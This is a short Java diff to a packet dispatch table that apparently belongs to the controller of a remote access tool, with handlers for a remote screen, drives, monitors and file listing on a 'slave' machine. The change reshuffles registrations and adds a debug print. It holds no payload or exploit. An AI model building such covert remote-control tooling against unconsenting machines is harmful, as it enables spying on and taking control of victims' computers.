@@ -37,15 +37,10 @@ public class IncomingPackets {
 
 		incomingPackets.put((byte) 36, Packet36Initialized.class);
 		incomingPackets.put((byte) 26, Packet26InitJavaPath.class);
-		incomingPackets.put((byte) 10, Packet10InitDefaultLocale.class);
 		incomingPackets.put((byte) 61, Packet61InitMonitors.class);
 		incomingPackets.put((byte) 62, Packet62InitDrives.class);
-		// 69
-		// 70
-		incomingPackets.put((byte) 11, Packet11InstalledLocales.class);
-		incomingPackets.put((byte) 12, Packet12Disconnect.class);
-		incomingPackets.put((byte) 13, Packet13Status.class);
-		// 14 free
+		//incomingPackets.put((byte) 12, Packet12Disconnect.class);
+		//incomingPackets.put((byte) 13, Packet13Status.class);
 		incomingPackets.put((byte) 17, Packet17RemoteScreen.class);
 		incomingPackets.put((byte) 18, Packet18OneRemoteScreen.class);
 		incomingPackets.put((byte) 19, Packet19ListFiles.class);
@@ -107,6 +102,7 @@ public class IncomingPackets {
 				}
 			}
 
+			System.out.println("Header: " + header);
 			if (header >= 0 && header <= PacketRange.incomingRange) {
 				ac.read(slave, slave.getDataInputStream());
 			} else {
